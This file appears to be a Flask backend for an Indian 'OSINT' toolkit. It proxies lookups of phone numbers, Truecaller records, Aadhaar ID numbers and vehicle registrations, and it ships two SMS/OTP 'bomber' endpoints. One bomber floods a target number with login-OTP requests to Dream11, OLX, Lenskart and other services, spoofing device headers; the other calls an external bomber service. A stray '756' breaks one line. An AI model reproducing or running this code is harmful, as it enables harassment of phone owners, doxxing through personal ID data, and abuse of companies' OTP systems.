from flask import Flask, jsonify, Response, request, send_from_directory
from flask_cors import CORS
import requests
import json
from bs4 import BeautifulSoup
import os
import time
import threading
import random
import string
import uuid

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

credits = {
    'Telegram': "@modsnew || @HUNTER_X_OSINT",
    'Developer': '@NuxoFF And @SHURU_33'
}

# API Base URLs
PHONE_API_BASE = 'https://x-trace-num-shuru-full-info.vercel.app/apis/num_info_v1'
AADHAAR_API_BASE = 'https://shuru-aadhaar-awesom-ff-api.vercel.app/apis/aadhaar_info'
INSTA_API_BASE = 'https://r-bots-free-apis.co08.art/api/v1/api/igdl'
BOMBER_API_URL = "https://vishal.lovestoblog.com/bomber4.php"
TRUECALLER_API_BASE = 'https://x-trace-shuruu-truecaller-info.vercel.app/info'

# Global dictionary to keep track of active bomber threads
bomber_threads = {}

# Helper function to stop a bomber thread
def stop_bomber_thread(phone):
    if phone in bomber_threads:
        del bomber_threads[phone]

# Bomber helper functions
def generate_uuid():
    return str(uuid.uuid4())

def generate_random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_device_id(length=40):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length))

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# ===== PAGE ROUTES =====
@app.route('/')
def route_home():
    return send_from_directory('.', 'index.html')

@app.route('/phone')
def route_phone_page():
    return send_from_directory('.', 'phone.html')

@app.route('/truecaller')
def route_truecaller_page():
    return send_from_directory('.', 'truecaller.html')

@app.route('/aadhar')
def route_aadhar_page():
    return send_from_directory('.', 'aadhar.html')

@app.route('/vehicle')
def route_vehicle_page():
    return send_from_directory('.', 'vehicle.html')

@app.route('/insta')
def route_insta_page():
    return send_from_directory('.', 'insta.html')

@app.route('/bomber')
def route_bomber_page():
    return send_from_directory('.', 'bomber.html')

# ===== BACKEND API ENDPOINTS =====
@app.route('/truecaller_proxy/<path:num>')
def truecaller_api(num):
    key = request.args.get('key', '@AwesomFF')
    url = f"{TRUECALLER_API_BASE}?key={key}&number={num}"
    try:
        r = requests.get(url, timeout=12)
        return Response(r.content, status=r.status_code, content_type=r.headers.get('Content-Type', 'application/json'))
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/phone/<path:num>')
def phone_api(num):
    key = request.args.get('key', '@AwesomFF')
    url = f"{PHONE_API_BASE}?key={key}&num={num}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        try:
            data = response.json()
            return jsonify(data), 200
        except Exception:
            return jsonify({"status": "error", "message": f"No information found for number '{num}'."}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"status": "error", "message": f"Backend proxy network error: {e}"}), 500

@app.route('/aadhar/<path:aadhar_num>')
def aadhar_api(aadhar_num):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    # List of candidate endpoints to query
    endpoints = []
    if len(aadhar_num) == 10 and aadhar_num.isdigit():
        endpoints.append(f"{PHONE_API_BASE}?key=@AwesomFF&num={aadhar_num}")
        endpoints.append(f"{PHONE_API_BASE}?key=SHURU_33&num={aadhar_num}")
    
    endpoints.append(f"{AADHAAR_API_BASE}?key=@AwesomFF&aadhar={aadhar_num}")
    endpoints.append(f"{AADHAAR_API_BASE}?key=SHURU_33&aadhar={aadhar_num}")

    for url in endpoints:
        try:
            res = requests.get(url, headers=headers, timeout=10)
            if res.status_code == 200:
                data = res.json()
                if data:
                    res_obj = data.get('result') or data.get('data') or data
                    if isinstance(res_obj, dict) and '0' in res_obj:
                        data['result'] = res_obj['0']
                    return jsonify(data), 200
        except Exception:
            pass

    return jsonify({"status": "error", "message": f"No profile found for Aadhaar '{aadhar_num}'."}), 200

@app.route('/instagram')
def instagram_api():
    ig_url = request.args.get('url', '')
    quality = request.args.get('quality', '720')
    if not ig_url:
        return jsonify({"status": False, "message": "Instagram URL parameter is required"}), 400

    target_url = f"{INSTA_API_BASE}?quality={quality}&url={requests.utils.quote(ig_url)}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(target_url, headers=headers, timeout=20)
        try:
            data = response.json()
            return jsonify(data), response.status_code
        except Exception:
            return jsonify({"status": False, "message": "Invalid JSON response from Instagram API endpoint."}), 502
    except requests.exceptions.RequestException as e:
        return jsonify({"status": False, "message": f"Failed to reach Instagram API: {e}"}), 500

def get_vehicle_details(rc_number):
    key = request.args.get('key', '@AwesomFF')
    url = f"https://x-trace-shruu-vehicle-full-info.vercel.app/api?key={key}&search={rc_number}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"Vehicle API error: {e}")
    return {"error": "Failed to fetch vehicle details from source"}

@app.route('/vehicle/<path:rc_input>')
def vehicle_api(rc_input):
    data = get_vehicle_details(rc_input)
    return jsonify(data), 200

# ===== BOMBER API ENDPOINTS =====
@app.route('/api/bomber/start', methods=['POST'])
def start_bomber():
    phone = request.json.get('phone')
    duration = request.json.get('duration', 60)  # in seconds
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    # Stop any existing bomber for this phone
    stop_bomber_thread(phone)756

    def bomber_task():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                response = requests.get(BOMBER_API_URL, params={"phone": phone, "duration": "10"}, timeout=10)
                # You can log or handle the response here if needed
            except Exception as e:
                print(f"Error in bomber task: {e}")
            time.sleep(1)  # Delay between requests

    thread = threading.Thread(target=bomber_task)
    thread.daemon = True
    bomber_threads[phone] = thread
    thread.start()
    return jsonify({"status": "started", "message": f"Bomber started for {phone}"}), 200

@app.route('/api/bomber/stop', methods=['POST'])
def stop_bomber_api():
    phone = request.json.get('phone')
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400
    stop_bomber_thread(phone)
    return jsonify({"status": "stopped", "message": f"Bomber stopped for {phone}"}), 200

# ===== OTP BOMBER ENDPOINT (Multi-platform) =====
@app.route('/api/user/<num>/<int:limit>', methods=['GET'])
def otp_bomber(num, limit):
    if limit <= 0:
        return jsonify({'error': 'Limit must be greater than zero'}), 400
    if not num:
        return jsonify({'error': 'Mobile number is required'}), 400

    for _ in range(limit):
        random_ip = generate_random_ip()

        # Dream11
        requests.post(
            "https://api.dream11.com/auth/passwordless/init",
            json={"phoneNumber": num, "channel": "sms"},
            headers={
                "a1": "T9oSmMvfsVPRiXo+qmWFr3fUPhnzFlUFZ5IKI2Dvm+ANybdlejtaC+7MZ69s6mkV25si46bw/8aI1YcMlAzcRAjof+WxYXOqYaBzJQawgVGs9Hy+/xeXQdmCeb+p+eTUCuGPSGwpPBc6LgFF0zjb5O+ebTy4WiDG03EeGNj2ZVbbvfedbTmzUbt8XzmVwOef",
                "Accept": "application/json", "app_version": "5.29.1", "Content-Type": "application/json",
                "device": "androidplaystore", "deviceid": "e274c6d7df441ded", "Host": "api.dream11.com",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # OLX
        requests.post(
            "https://api.olx.in/v2/auth/authenticate",
            data=json.dumps({"grantType": "phone", "language": "en", "phone": f"+91{num}"}),
            headers={
                'X-acf-sensor-data': '2,a,V92+LTtfNz6sUOK8r1eZqFhN5UiDOdrnOy772zwaUUtiZL3enp3OA4qJ2vW/atMZXXiXas7eUcirPad1JI9XKGnHP978bzDaPEV1lIEGMxDUtXbsoWU+9ti9QaTliRbcaSeaoB6uA5Es2NWOxddJQR8iUGn/TMc8I5gPB/36Tzw=,...',
                'User-Agent': 'android 19.07.000 olxin', 'Content-Type': 'application/json; charset=UTF-8',
                'Connection': 'Keep-Alive'
            },
            timeout=10
        )

        # Licious
        requests.post(
            "https://node2.licious.in/api/v2/otp-signup",
            json={"customer_key": generate_random_string(), "phone": num, "captcha_token": ""},
            headers={
                "Accept-Encoding": "gzip", "app-version": "282", "Content-Type": "application/json; charset=UTF-8",
                "deviceid": generate_random_string(16), "Host": "node2.licious.in", "source": "android",
                "User-Agent": "okhttp/4.9.2"
            },
            timeout=10
        )

        # Unacademy
        requests.post(
            "https://api.unacademy.com/v3/user/user_check/?enable-email=true",
            json={"country_code": "IN", "phone": num, "send_otp": True, "otp_type": 1, "app_hash": "uI6w7mnt583"},
            headers={
                "Content-Type": "application/json; charset=UTF-8", "Device-Id": generate_random_device_id(),
                "Host": "api.unacademy.com", "X-APP-VERSION": "197150", "X-PLATFORM": "5",
                "User-Agent": "UnacademyLearningAppAndroid/6.133.0 Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # Doubtnut
        requests.post(
            "https://api.doubtnut.com/v4/student/login",
            json={
                "app_version": "7.10.51", "phone_number": num, "language": "en",
                "udid": generate_random_string(16), "gcm_reg_id": generate_random_string(16) + ":APA91" + generate_random_string(40),
                "aaid": generate_uuid(), "course": "", "class": ""
            },
            headers={"Content-Type": "application/json; charset=utf-8", "Host": "api.doubtnut.com", "User-Agent": "okhttp/5.0.0-alpha.2"},
            timeout=10
        )

        # Lenskart
        requests.post(
            "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            json={"phoneCode": "+91", "telephone": num},
            headers={
                "Content-Type": "application/json", "Host": "api-gateway.juno.lenskart.com",
                "udid": str(uuid.uuid4()).replace('-', '')[:16], "uniqueId": generate_random_string(16),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # Healthkart
        requests.get(
            f"https://api.healthkart.com/api/user/validate/1/{num}/signup?plt=3&st=1",
            headers={"Accept": "application/json"},
            timeout=10
        )

    return jsonify({'status': 'success', 'message': f'Bomber completed for {num} with {limit} OTPs'}), 200

# ===== HEALTH CHECK =====
@app.route('/health')
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"Backend API & Clean Page Router running on http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)